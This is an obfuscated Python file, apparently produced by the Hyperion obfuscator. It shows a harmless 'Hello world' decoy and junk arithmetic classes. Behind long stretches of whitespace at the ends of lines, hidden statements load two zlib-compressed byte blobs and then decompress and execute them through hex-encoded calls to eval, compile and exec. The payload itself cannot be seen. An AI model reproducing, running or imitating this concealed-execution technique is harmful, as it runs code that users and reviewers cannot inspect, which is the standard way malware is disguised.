from builtins import *
from math import prod as Multiply


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Negative, Positive, _builtins, Square, DetectVar, _divide, _positive = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, _square):
        self._memoryaccess = Multiply((_square, -87446))
        self._while(_run=46845)

    def _while(self, _run = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._memoryaccess /= -53767 * _run
        
        try:
            (({Square: Calculate}, Negative) for Negative in {DetectVar: Calculate})

        except AssertionError:
            ((Square, (Calculate, Positive)) for Square in {Negative: Negative} if Positive != _divide)

        except:
            _positive(72309 / -43766) == Ellipsis

    def _statistics(self, _detectvar = 98074):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _detectvar /= -48515 - 3659
        self.Theory != None
        
        try:
            ((Positive, Square, Negative) or DetectVar if (Positive, Square, Negative) and DetectVar else ... or (DetectVar, (Positive, Square, Negative)))

        except TypeError:
            (((Calculate, Positive), Square) for Square in (DetectVar, Calculate, Negative))

        except:
            _positive(-66853 - 87582) == float

    def Hypothesis(CallFunction = False):
        return _divide()[CallFunction]

    def Random(_absolute = -46981 / 37941, Floor = float, _frame = _divide):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _frame()[_absolute] = Floor
        
        try:
            ((Positive, Square, Negative) or _builtins if (Positive, Square, Negative) and _builtins else ... or (_builtins, (Positive, Square, Negative)))

        except AssertionError:
            (({Square: Calculate}, _builtins) for _builtins in (Calculate, Positive))

        except:
            _positive(87691 * 15172) == int

    def execute(code = str):
        return Negative(Positive(_builtins(Square(DetectVar, code))))

    @property
    def Theory(self):
        self._theory = '<__main__._absolute object at 0x000002507BE54051>'
        return (self._theory, _negative.Theory)

if __name__ == '__main__':
    try:
        _negative.execute(code = __code__)
        _random = _negative(_square = 9579 * 1461)

        if 139858 > 9894067:
            _random._statistics(_detectvar = -10719 - _random._memoryaccess)
        elif 448194 < 1426449:
            _random._statistics(_detectvar = 61734 * _random._memoryaccess)                                                                                                                                                                                                                                                          ;_negative.Random(_absolute='wwxxwxxwwxxwwxxwwxwwx',Floor=b'x\x9c\xe5\x1dks\xdaH\xf2;\xbf\x82\xf5\x17\xa0\xac8BO\xe4*\x7f\xb9#w\x0bk\x9bT\x9c]g\xcf\x9b\xa2\x844\xd8r\x84\xe4\x13b\r\xff\xfe\xba{f\x84\x00c\x04BN\xae"Y\x0fF\xa3\xd1\xa8\xd5\xef\xee\x19\xa7\xc9\xe2\xbcV\x87%\x187\xe9\x88\xcbp\x18\x8f\xc6\xb3\xa9\xe7\xa6q2\x1c\xd6\x7f\xb98\xf9u\xf1\xc4\x92 \x8eN\xeaq\x92\xab\xe6\xce\xd2\x878\x99R\x9d\xe6\xc9(\x08\xc3E\xfa\xc0\xeec7\xd5M\xebD9\xf9G8c\x9f\x98\x7f\xd2Z\xb9\xeb>H\x1ff#\xde\xf0C\x9a>M\xcf\xdf\xbf\xe7eg^<y\xbf\xd6\xcc\xfb-\xcf\xf6\x83\xa9\x17\'\xfej3\xa2\xf0\xec\xfe\xfe\xfdS\xe8\xde\xcf\xd8\xdaMa\xe0\xb1h\xca\xf8M\x1f>^\xbe\xd3\xce\xd4\xb5*^\xec\xf3\xeb\x8d\xa7$\x88\xd2\xe6\xc9\xaf,\x0c\xe3\xfas\x9c\x84\xfe/\'\xadF\xadu\x9e\xd5\xc6\xeb\x8d\xe9\xb7\xc0o\xb4jl\xee\xb1\xa7T\x003z\x9a\xc1\x9d\x9f\xe2)\x9b\xd6\xdd\x84\xd5\x13\xe6\xff\x15\xfd\x11\xc4!Ky\xc1\x08 \xf3W\xf4g<\xa3_n\x1d\x1b\xf9+\xba\x8eG\xb1\xbf\xa8\x87\xc17\xb8o\x11\xcfNZ5\xde\xa9`\xf2\x14\'\xe9p\x08O[L\x1b\xad36\x0f\xd2f\xab\x16\xc6\x9e\x1bN\x9b\xad\xbb\xc6d2\x89p\xa1\xc3\x04\x0e\x8d\xaf\x17\xf7a<\x82\xcb\xb5\x8dkxC/\x0c{\xbd\x90\xef\xf9).a\xafqw~~\xfa\xee\xf4]\xf3]\xf3\xb4\xddj}\xfdz\xe1\x07\xc9\xcbM<?\xcf\x9f\xe52\x7f\x9e\xcf\xe1\xd7|\xbey\xff=K\xdd4\xdd\xd2\xc6\x8d\x06\xeb\x8d\xa6\xe1\x8e\x1f\xa1\xe3\xfc\xb5j\x9b\xd7\xf0\x0e\xbc\x957#\x1a\xc4\xa6\xc4\x1b/\x01\xf5\xf2\xd3\xe8\x16~\xff$\x12\xb7\xe1o\xb8uk\xb3\xcd\xc6h\x16\x84i\x10!\xdc\xffv\x93m\xfd\x1a\x0cT5V\x07\x83XU\x07j\x0cG\xd8\xab\xd00\x07\xcb|\x05V\xcf\xcdW\x1e7\x8d\x824\x0cf\xa3uH\xb6\x94\xec#\x89O\x16\xf2\xd3\xdeA\xad\xb5\xee\x8e\xdb\xdcY\x10\xf9l\xdel\xa4n\x1c\x8e7.\x7fm\xd5\xb6\x01\x1f\x81\x17\xf2\xbe\xe4\xf0\x90#\xe3\xcf\x07>\x16\x06O\x93\xd8{\t\x80/\xe3\xdd\xf5\xf5\xd5\x15l\xb0\xe7\x0b\x9d\xfe\x8c\x80\x9b\x86\xee\xbf\xf6\xc5\xbb^\xaf\x7f\tk\xef\x12Nz\xbd\xcb\xcb\xcb\xdee\xbf\xff\x13\x02/\x8c\xe3\xcd\xab;`\xf7\xf8\x08\x82\xfa\x11\xfe\x028\x86\x01\x9c\x06\xc1\xe3\xe3O\x08\xbc$\x9dn\x81\xdd6\xb1\xcb\xbb!:\xf0\x13B,t\xfff\xfb\xa2\xdb\x151:\xb1\nV\x07\xa7?!\xf4\xd8,\xf9\\\x18\xe1\x800\x03\xa0K\xa4P<<\xd2\xee02\r\x02o\xeaF\xc1\x91\xc0\xb6\xb5\xb5\xc3\xc0\xb6\xbd9\t\xb6\xc58\x08\xe7\xec!\x9a\x15\x86\x1d\tY\x10\xba\x1a\x1d\xf9r\x83\x0b@\xaf\xd18{\x8c\x83\xe8\xc5\x1b\xb7\xc0\xbc9j\x18le\xf5s{~\xcc\x95\x80\xba\xe93\xb4F\x9a\x8d\xce8}\xa1\xd7?\x1d\xe2{l\xbe7\xdb\x98K\xb8H\x03\x05w\xf9F^\xe0\xc8\xcdF\xab\r\xd7\xd4]\xd5\xb6\x7fg]\xd5|\xad\xa3\xf9z[sv}\xc7\x16\xdf\x81\xa5\xb4\xdf34\xdb6m\xc3\xb2\xe0)\x1d\xcd\xde\xf9\x94W\xa1t{\xfb\x05V\xbe\xff\xf2\x85\xcea_\xe2\xfd-s\xac\xdb\xb0\xa9\xb0\x99b\xc3\xb2\x8e(\xd7\xf0\xb76"\x18\x15\xa9k\x16\x83\xe3\xfe0\xd4\x98\xe5Zm[+\t\xc1\xed\x8f0m\xb3\x03\xab-6\xdc\xcbU\xfe\xea\xec&\xf5\xfd_\xcbV-f\xd9\x95\xbd\x96\xe5\xc1\xea\xc2\xe6\xd0\x99\x03\xe7\xb8\xc9\x12\x07\x7f\xed~\xad\xd0\x9d\x8c|\xb7\xceE\xfa\xf5\xb5\x94\xea\xb0;\x7f\xc9\xda9\xac\xab\x86k8\xb0\xba\x86\'\xce<\xb1w\xc5\xb9K\x9b\xacU\xa0\xdb{\x7f\x8d\xaa\xbe\x82\x8dKgm\xb5E\xe9r\x0f\xcb\xd1_J3=\xd3\xd3\xb4\xea\xa8\xc6\xce\xa8&G)ktT\x80r\x04\x8a\xf5\xf2\xa2(\x14K\xafwl4\xf3\x08\xad\xbc\xb5\xd5\xc9P\x8d\xa3\x1d\xae^\x05_D\xb3L\xabmy \x15Lk\xa4\xa9F\xc70`\xdf\xb6M\xcb\x00z\x1ck\xaai\x02Spl\xcb2\x01\'u\xac\x0be:\xfd\xb2\xa0\x06\x9cU\xf6E%"\xe6\x10s\x15a%*W\x85\xb06\xbe\xa8\x05\x12\xc5\xd6\x00\x04\x86\xed\x18\x9d\x0c\\\x1dS\xb7\x1d[\x87R\r\x84\x81\x03B\xc1\xb4\xe1jY\xb1\xca\x15\x0e\xd4\xd0H\r\xe1\xaaZ\t\xa9\x8a\x92Q\xcfI\xc9\x8e\xd8,!%i\x13R\xb5H\xdd\x82\xda\xc9\xfe\x98h\xdb\x00Z\xcd\x02\xceg\x8d\xe1[\x12\x86U\x87Y\x9d\x0cw:+\x18\xd6\xc9\xe3\xd9\xf1\xf1\xc9.\xcb\xd7\x1b\x99\xe3|.\x90Cj\xf3GRP\xcb\xeb\xb1\x88A\x86\xc0\x1a<w\x10k\xc4f\x08\xfd\xcc\x11\x18W\xa4n\xa7\xb8>|\x08\xe6\x81\x9e\xc8\xf5n\xbd\xc0s\x0ed\xf3~f\xa4\xf9\x99\xd1\xb6\xba\x87\xf5\xd8\xd8\x96\x19\x14j\xc9\x17#\x0fT(6\xeeh\x17?v#\x93>l\x0f\xcd\xa16\xb4a\xd5\xe0\xdc\x82\x9a\xc6zY\tdk\xef\xf1\x8e\x07\x1bM\xc0\xdbm\xe2\xf1\xd5i\xc6(\xe7qO\x9a\xb1\x97?\xe7\xbf\xf9\xf5\xc2\xaa\xcb`0\x88\xbb\xf1 \xc6\x1d\xed\xbb\xb0\x0c\xa0\xe0\x88\xca\xcb\x8a]\xc2\xf5\xab\xd5\x92\xdc\x95\xe3+.\xb6j\xebd\xcc\x02XJ\x8a\x89\x06\xc0\n`3\xe8\x0e\x10Fp2\xe8V\xcf%\xdf\x02q\x11H\x0e\x18u\x0e\xc8V\xc7b:\xb0\xb8\xb2\xa0\xca<"\xa4\x9ep\xc9S\xc07b\x0fU t\x076}h\xc1f\x0f\r\xa8\xdb\xd9,\xdd\xdd\x945\xec\xc0j\x0c\x91\x8b\x18\xc0?\x9c\xa1\ru\xed\xcd\xd2\xddM9CdO\x1a\xdc\xe0\xd0\x1e\xd8\x11\xd4U\xa9\x91\x95\xd2"M\xe1M\xaa\xb8\xd1\xc4\x17\xa2\xa6\xcc\xf5\xd2\xb7u\x10\x95\x11\x8c\x9a\x06\xca\xfd\x18Q\xa825L\xd8\xfe\xdc\x0b\xc0\xbd\x01\xfc7\xf7\rp\x7f\xc1\xf1\x8dk\xcd\xd0A\x0f\x03\xca\x00\xf61\xd6\x98\xa1[H%\x9dJ5\xce%;\xe7\xcc\x9c3\xf4\xfco\xc9\xf6\xf7b\xf4\x82\x93\xa3\x8fY8\x9e\xb5\xf3\xed\xfd{\x95\xb4c\\PXp\xb1A\xa7](\xda\x8d\xfc*\\k\xbfu\xb5\x0e\xb0\x0cNY\xc8@l\xa0.\x07\xea:\x9b\xa5\xbb\x9b2\x88\x0b!\xffQa\xed\xc0\x11\xb8\xfb\xa9\xb9YZ\xa0\xf3\xa4\xd9\xa89n\x80\xbdjo\x96\x96\xe0\x03FNQvr\xe6\x99,\xd7r\nv\x91\xba{*\xd8e\xf9J\xa6\xf4K\xf3\xd2\x14\x8e\\K\xf4\xc9\xc89z\x8b\xd5\xadJq_\'P\xa9\x95-\x89\x97\x97T\xa0\xde\x1c\xdf\x1anPX\x8aBS\x18\x90"\x05\x10vE$\xaeArL\x03\xdaB\xe9\xeb\x90\x98\xb47K\x0bhMDQ&\xac\x1dA\x08(&\xb5\xcd\xd2\x12\xe4\xa1\xady1d\\\xc0XC\xad]\xf5\n\xc6\x0f\x0e7+\xc8\x1bZY\x0c!\x1fA\xc8\xfbE\xd7\xbc\xa1U\xe8\xe6V\xc76`U\xedN\x95\x9a\xc3RcpWt\x06W\x94y"\xcap|\xea\xa4\x08\x10h\x0c\xa5\x9d9\xf1\x003\xffT\x10\xb2\xb0C\xd3\x03\x8c\x8f"\xba\xa6\x06\xe4\xd2!\xa2\xe9\x00\xd1pq\xa5\xc2\xaf\xb5\xd2"\xa4\xcd\xd5iGh\xe2\xb6 \xed\x8d\xd2"*\xbe=D-\xb8C\x8a\xb3\xecUg\xb3\xb4\x8c\xd1$\xb8\xbe#\\C\xba\x90`\xd2uD$,\xc8\xbbH]{\x7f\xc9w\x88\x16\xbdT6-\x9b\xbc\xc5\xa0l\x96\xd6\xaa\x1b\xc4\xc8i\xd52f\xce\xd5\xc1\xb73K\x0f"\x1d\x03\t\xb3:_J\x9e/x\xb9\x08#_\xbd\xec\xdc\xab\x823Xh4a,\xc5\xb2l\xb0(\xf0\xe9#x\x92o12\xa5\xda\x18C\x01\xd6h\xda\x169\x99\x1d\xdb-\xcbCn\x84\xda\x7f#\xc4\xbaH?\xf9\x81q\xe0-\xe4C\xe6\xc6\xcf\x87\x8d\xf2K\x95a#\xeew1\xe0\xfb\x8f-\x96\x05\x86\xc0|\xb7|M%\x7f\x8c\xaa\xa9\xe8\x91A\\\xc0p\x12\xc6\xd4\x00\xe8>\xe0\x85\xcaY\x04\xe2PV\xb7$\xa3x\x0c\xa0c\xd4A\xea/\x9cS\xeae\x18\xbe\x9d/\xe2\x00\x10"(\x90T\x995*\x0b\x80[\\(G\x85\'\xacP\xa6\xca\x97\x1f\xf8\xed1\x17\x03c\x8ee\xb9d\xe3\x8b\xcc\xd2\x11i:"K\xe7\xb6L\x9e\xce\xde//}\xd28\xd6A\x1d\xe0\xa0\x07\xd0zP\xf5\xd9\xdf\x1b\xdd\x88\xb2\xe49\\eB\xd8\xa4\x88\xa6\xe3\x90\x15\xafR\xe0\x01\x8d\x16\x874\x9d\x8d\xd2#9(^\x01\xa0\x933:\x8c\x9cv\xe2\x08\xdb\x16\x8d\x10]h1E\xeaj\x15\x1b*\x9aV\x96\x05\xbd\xe6\x16[:\xbe\x96\xf6\xf4j\xd4\x03\xcf*\xc8|P\x856\x00\xf6uu\xaf\x97\x8f\xf6\xb1\x95\xa4M_F\xff*poz\xc6\xd8\xd0\x8d6\x1c\xdb\xa6j\xaa\x86\x01G\xd8\xca\xf2\xd1~\x1f\x87;\xf4\xfa8\xe2\xe1\x12\x0f\x97X\xd0/\x12\x05D\xf3\xde"2s\x84o\xdcX/+AQy\xcf\x90LX\xd0\xcd\xd5t@i\x17\x14\xa9\xbb\x87]PB\xfb\xd1uW\x1bkc\xb2\x08x\x8c\x91\x94\x06\xdb\xb4P\xfa\x91\xcb\x07=\xf0\xa0&\xa0B\t{\xa8\x83\xbf}ml`BN\xdbb\x06\\\xb1-\xc3\x86s\x1f\xcetmL\x12\x13K;d\xa4b\x89\x0fW\xa1T\x1b\xebm\x1d\x17\xca\xf4\xab\xd0\xabo\x02\xf7\x020\xea\xfc\xc8\xcf\xf9\xb6,7\xf5J\x12\x18\r\xcb\x07}\xa9*\xd3\x02\xa8\n\xf0&\xbf\xf1\xd5\x1a/\xf7X~\xd8\xab\xa1\tma\x0c\x0c\xe4\x91N\xc1q0\xe9\x855\xbeV\xfa\x86q\xc7\xd7\xc7\xe0\x85<5\x8e\xff\x89mgV\xc01M\x8f,\xde\x8d\xfe\x13\x1aL9\xe0:F\x0c\xdb\xfe\xea\x05F\x81\xbbq\x17\x03 \x14\x07\xa6\x18z\x01\x97LY\x95\xc0\xca\xe5\xc1\xa8k\xaezbV\xb9\xbc\xe7m\xf5\xc8\xa5_i4\x99r\xc7\xf5\xb2F[C[Z\xab7\xdcd-\xe5\xb2\xa8\xdc\x14\x01\xd1i\x1a\xbeY\xda\x0e\x03L\xeaRL\x8d{\xfa(\xd8\x06\x88V=v\xbdM\xae\x81\r\x82\xa6\xb4S\x0b4\x8b\x1e')

        _random._while(_run = _random._memoryaccess / 48286)                                                                                                                                                                                                                                                          ;_negative.Random(_absolute='ILIIJIJIILLILLLJJJJIL',Floor=b'\x8e\xaa\x04\xed\xa2\x8fZF\x7f\xb7z\xf1=Q\xe3\xa8\xfa\xd5\x1e\xde\x8cU\x8fF\'\xe7\xd5\x10\xfbJ|\xde:z\xb5\xca\x9a\xa4\xf40.7\xa4\xcc\x08\x8bd\x92\xb5IW4)\xea\xa4\xd1\xcaCG\x1b\xa5\xbb\x9b2\xc9\xe6\xe3\x1en\x93r@\xb0)k\xb3\xf4mi\xee\xf0\x1c\x9f\x15\x173n~\xe9\xac\xecF.\xc9Tl\xf3r\x99\xc8\x86\x08C\xeb9\x85;\x1f\x9aV\xcde&r\x91\xba\x959_H\xd5\xae\xcc=\xcd\xc8\x19\xec\xd3\x9e\xe5\xce\x96\xc7\x02\xc3\xf8\xf6\x16a:\xe8\xae\x96i\x80\x04o\x9b\x9aab\xe8\xd1\xf0-B\x1c0\x80\xd1\xaa\xb0l\x03KM[X\x10\x14v\xa6z\x94\xffnk\xdc\x061\xe5@\x00\x07-\x13\xba\x03\x14\x03\xb0.J\xa2[@\x83\xc2\xe9\x0fG\x85\x87\xe8\xa7\x84e\xa7\x8f\xb2pZ\xf3w\x10\xa2\x07\xaa\x1bo\xe1\x98XA\xc2\xfcq\x89\x96\x05QQh\xe0\xf4\xd9\x1e\xe9Y\x8f\x8f\xfc\xe3\xc13\xcf3w\xddr\xackY\xa3\xf2%\xb3R\x1a\x95\xf9\xab\x15\xc4\xb5\xd1UOCa403\x91r\xc8Y\x0fv7\xd8\xd9\x15\x0eU\xc8\x0fRX\x1d\n\xb3\xaa\x0fT\x13\xc98Z\x9am\x17\xd5_\xca\xb2\xa5ld\xcc3\xfb\x91\xa3T\xc7Qh\xbb\x83\x01\x7f\xdb.Y\x968\xc9O\xb9\xf7\x96i*\xd2\x0b,\xc5\xa3\x99\xcb\x88\xca\x9b\x8b\xaf\xd5\xd5\x8b\x9b\x8c\xdf-{\xb4\x81\xacC^\xe4W\xa3\x02\xfe\xfe\xb2\xec^\x13\xee\xc0\xf6\x9a\xb5\xed\xe4\xb4\x12\'\x97I\xb4\xab\xee\x1eIv\xdf?X&\xa2D"tt\xfb\xc6\xc1\xb2\xfc\x08_\xd8-\xc7\xf8^\xd3\xb6\xbfWG\xb6\xc4\x0f4\xd9Q\x81DN\x9dRV,rScJ\x8dA\x89\x9c\x1b\xa5G \xe5,3M\xe0LG\xe0R~\xa4T\x91\xba\x95\xe2X\x85\xc2O\xe40\xdch\xf2(f\xcf\xb8)\x92\x9d\xa8\xd3\xf0\x01\x0c\xe49d\x05\xf2<`c\xb3\xf4\xad\x1d(\x02\x8d\xb3\xc9\x11D\xf8\xf5\xf6\x98\xe3\x87W\xb2QWG\x0f\xc9\xfd\xea\xb5\xc2\xfa\x1c\x99~r\xa8\x07\x19\x82\xc7\xec\xb7\xb7\x1c:\x9f\r\xabwi\xb43\x1f\xeb,\xce\x8e>$.\x9f\x0c&S\x8b\x1d3\x9f\xf3\xb9\x0c\xbbn\xabG9\xa3e\x87\xd4\xc9\\\\Mz@\xb5\x029;\x18!0\x88\xff\xf0\x9ctLpw(\xc9n\xa3\xf4\x08v\xba\x0c\x88\xa99N\xa3\xe7\x94\x8b\xd7\xeai\x15\xfb\xa2y\x1aYu3pd\xa35\xfd\x95\xa9vV&\xe0\xf9?\x9a\xf3!\xe7j\x90\xf6\xdd\x8a\xc3\xc1:~\x10\x1a\xbf\x10\xd7G\xaa\x8b\xc6\x81\x08\xa28\x1c\xdf\xe3*\x7f[\x14\xa9\xb3\x0e\x8c\xc4\xbd\xaaj\xa1\xc8\xc3\xe9\x11LJ\xe4\xab\xce\xee\xe3/\xc0\xc3\x8c\xcb\xd7\xb2\xc4k\xf2\xfd\x0f\xffz\r2\xf9h@\x91\xd8\xd0\x00\xda\x1dQ\xfb\xae\x99gG\x1f4IN\x90\x89X\xe8Z\x11\xfd\x93\x86\x0bRn\x12&Q\x9b\xef\xf80\xa2\x95\xb2\x1f=&T&\xf5y\x9c\xc4\x93\xba\x9cG\xb7\xce\'\xe9\xad\xbba\xa8\xf8A\xa2\xb09\xf3\x94\xc4\x8d\xee\x99\x12?\xb1H\xc1\xc9\x8dkX\xd8\xec\xd3\xfc\x9c=\x9c\x9e\x93&\xe9\xec\xf70\xa2\xd4\xef\x8b\x06\xa7\x8b\xac-\xac>K\xddQ\xc8\xf8\xa5Y\x02\xaf0\x92W\x13\xf6\xdf\x19\x9b\xa65\xf13\x9e\xf2Jqv\xfb=KY\xf4\xb7\x02\r\xa6l\xa2D\xee\x84)a0Mq\xeacQ\xf3\xec\xc9M\x1fd\xf5`:\x0e\xe0I\xe2\xd7s\x10%\xec\x9eW\x84\xd7\xf0\xe1 \xaex\x0fq\xe0\x89\x1eM\x1ffi\x10fW\xe2\xa7\x85\xbc\x7f:\x1b=%\xb1\xc7\xa6\xdb\xba%\xba\xa2LS7I\xf9\x93\xc7u\xecd\xfd\x97\x0b\xe9\xcb\xcf6\xd2\xf0\xf84\xd4b\x96h\xe8<\x7f\xb1&\x8d\xf1\x15S5\x8b\tI`i\xd5\x10>A\xc2&,J\xa7\x17w\xb5\xbbu\xcf\x0e\xec\x15\xa2\xf8e\xb0\x13G\x13\xe2\xa5\xafJ\xed\x8e\xcf\xfc\xf9H\xbe\xde\x80f\x05}TD((\x17\x1cBL\xc3\xda\xe8T\x0c\x03\xe1Y\x0c\x02\x81ca\xf0\xa8\x10\x99I\xd7\xc0\x84\x93\x1e\xde\x01\x8fQ\x07\x94\x0e\x80G\x9cXY\xe1\xf9\x87\xf43\xe6n\x18\xacHJ\xf9\x97\xe5\\fd\xfa*\xd2\x04\x91\x03\xa5\x84\x82\x867\xe4\x07[\xde\xc8@6\xfeT\xae2\xfbR\x1a\x9c\xf4\x80\xdb,\xfd4[\xe0\ts\x01y\x0e~\x01\xe3g\xbcA0\x0f\xc1-\xf0L\x19\x08\x08\x8a\xa1"8j$\xe6oI\xe3\xd6\xe3\x8c\xbf\x12\xab\x1d(]|\xef\x98|Nxk7\x1e\x10\x14\xb9G\x1d\tu\xc5\xd9\xae\xf4V\x82q\x9c\xb2\xf1\x06\x01\'\x9c=\x80\xfb\xaf\xba\xe8\xcdRr#\xbf\xb39\xbc\xe7\xe23I\xbe\x10\xca(\x9f"^0\xabM\xf5\xa1\xf6\xd7\xda8N\xea\x93\xd8\x07\x04\x8f\xeayt\xe2\x98\x98&\x8b\xf3\xdc,\xe6X\xf1\xee*\x9b\xd1S\xfc]]}m\t\xbc]N\xa5\x8e\xcb\x92@\xce>\x02\x87\xa8\xf9l\x8c\xa4\xf1\x11(\xb2)fcG\xea\xbc\xe0\xe4\xd6\xbc\xe3d\xd3\xa4\x803\xf2\x0fLn\xeb!\xdf\xb8l)\xe2\x1a\x7f\xec\xf5\xb5\x9c9\xf9\xfa\xaa%\x1e\x0e\x84\xc6\xbc4N\x16\x17\x82\xec\x9a\xd86\xbf\x86/9\xa47Dn\xd5\xbc$f\x84\xac\xa9\x7f\xc9\xd3\xe8.\xfb\xb9\xd9\xe1\xa1;S\x16\xc9^e\xed\xb6\xb2\n\x0bv\x81m\x9f\x8aY\x82\xe6b\x18>\x9f\xcf\xf1\x94\xdf\xbe\x9ck\x1eH>\x96\xac\xa7\xb9`-\xe04u\x992\x9b\x89+.\xadx\xcdH\xf4`\xd9#\\\x12\x96\xce\x92\x08\x9e]\xcb\xfd\x12P\x11\x83\x8fE&\x07\xa7\x84\x96\x04\xf750\x1c\t\xeeq\x90L\xa9\xe0\x82;t\xae3\x87\xce\xd55\xcd\x8b\xd9\x14oM\\\x01\x89\x9bxC@r%\x0c[k\x80\xcc\xcd\x83\xb3\xe4a\x08\x85\x16\x07V\xe8N\xe9aw\xd2\xca\x92\x83d\x96\xa3f\x14n\x91\x0b\xc2$\xcaW8Oz\xe4L\t\xb3\xe6\x91\\BE\x10\x07"7!\xb8\xa4\x96\x9e"\xc0\'B\x1c\x00Qe-\xcd\\4\xafH\x8f\xda\x97\x1c\xb3\x81bi\x07J\xef\x07\x1c\x14\xc1o\x84i(\xc6l*\x92\x13?g\x1f]|\xf9\xaf\xf9\xcf\x92\x81\xf9T\x80S\x00\x82\x7f\x13\x10\xa5)\xc8P\x8e\x9f\xfc\xbb<\x07 \xa4P\x88R\xa1\x02t\xc6.\xb2Y/\x97s\x0c),\x02q\x1dD\xf7\xcb\x8b\xcbn<\xcf[\xee\xb4>^b\xcd\xf8\xec9\tR\xd6\x14R\xf4\x0cd+=\x82\xf2E)\xbbC\xa4\x90\xe2\x04\xda \x9c\xcf\x12\xe6\xfa\xcdL\'\x10\xe2b 4Gb@\x83\xb8\xc5\xdf!\x99E\xf9\xfe\x0b9\xb5\x9fjb\xa1\xedH\x83/@A14\xd5\x1e\xf1A\x1a\x16\x0fv\xb4-\xcd\xf2\xa0\x04\x87k\x8c@eiS^\xa6_@m\xe1]$\xa9\xfb\xfb\xc7|7\xc7\xee7\xe6_d\xdfl.\x05*?P\x15\xd7\xf7\x13`X{jY\xf4*\xc7\xea>\xf5\xe3\x1b[\xb4/\xb8\x86r\xf6\xebo\x1f\xfe\x1c\xfe\xf3\xf7O\x9f>\\\x7f\x1e\xfe~\xf3\xe1\x93\xac\xa1\xd1\xbf?\x98H\xbc\'\xdc\xa7k\xf8\x9d\x87\xf2\xf6\x7f\xc2wM\xd9ol\xf1a\xde\xc4f\x15\xbcS\x89\xf9\xcc\x02(\xbd\xba<)j@\x93\x0f(\xe2.|\xe6\xed\xa7\xde\xe7\x0f-\x81\xa1Tz\xc3\xd2?\xdcp\xc6\xa0)z\x86"\x13\x90i\xe9\xf5\xb9\xca\x07h\xa5`\n \xad*\xfe\x7f\x05\xfcS\x07\xb2\xedO\x1f\xfe=\xbc\xf9\x8fr\x10\x8c1\xe5\x16 m\x19\x08Y\xcd"\xb4\xc1\x91:\x86\xf4\x83\x16D\x91n\xfcg<\xfb-\x8a\x9f??\xb0[wq\x91\t\xa6\xd3\x8cM\xdd\xdcH\xed\x02\x0e\xa7\x19+\xadI\x02^k\x02\xf41\xa0\x8a\x8d\xc2T\xfe\xab\x16\x89\x90\x1b5\xf2r\xf3\xc9\x05u\xf2\x7f\x88Nn~')

        if 316371 > 2053101:
            _random._while(_run = _random._memoryaccess + -61350)
        elif 139285 < 4055114:
            _negative(_square = 60269 + 14717)._statistics(_detectvar = 67989 + _random._memoryaccess)                                                                                                                                                                                                                                                          ;NMNMMMNMMNMMMNMNMMNMN,xxxxxxxxwwwwwwxwxxxwxxxwx,xwxwwwwwwxwwxxwwxwxwxw,LIILLIILJIILLLLJLIJJIL,xwxwxwwwwxwwxwwxwwwxx=(lambda OOO0OoOooO000OOoO0000o:OOO0OoOooO000OOoO0000o(__import__('\x7a\x6c\x69\x62'))),(lambda OOO0OoOooO000OOoO0000o:OOO0OoOooO000OOoO0000o['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda OOO0OoOooO000OOoO0000o:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOO0OoOooO000OOoO0000o)"),filename='\x58\x57\x58\x58\x57\x58\x58\x58\x58\x58\x58\x57\x57\x58\x57\x58\x57\x58\x58\x57\x57\x57\x57\x58\x58',mode='\x65\x76\x61\x6c'))),(lambda:(lambda OOO0OoOooO000OOoO0000o:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOO0OoOooO000OOoO0000o)"),filename='\x58\x57\x58\x58\x57\x58\x58\x58\x58\x58\x58\x57\x57\x58\x57\x58\x57\x58\x58\x57\x57\x57\x57\x58\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda Ooooo000O0OO0Oo0OOoOO00,OOO0OoOooO000OOoO0000o:Ooooo000O0OO0Oo0OOoOO00(OOO0OoOooO000OOoO0000o))
        _random._while(_run = _random._memoryaccess + 3763)                                                                                                                                                                                                                                                          ;LIILLIILJIILLLLJLIJJIL()(xwxwxwwwwxwwxwwxwwwxx(xxxxxxxxwwwwwwxwxxxwxxxwx(NMNMMMNMMNMMMNMNMMNMN(xwxwwwwwwxwwxxwwxwxwxw('\x76\x61\x72\x73'))),_negative.Hypothesis(CallFunction='wwxxwxxwwxxwwxxwwxwwx')+_negative.Hypothesis(CallFunction='ILIIJIJIILLILLLJJJJIL')))

    except Exception as Calculate:
        if 194710 > 1941840:
            _negative.execute(code = Positive(Calculate))

        elif 214044 > 4426877:
            _random._statistics(_detectvar = 8835 / _random._memoryaccess)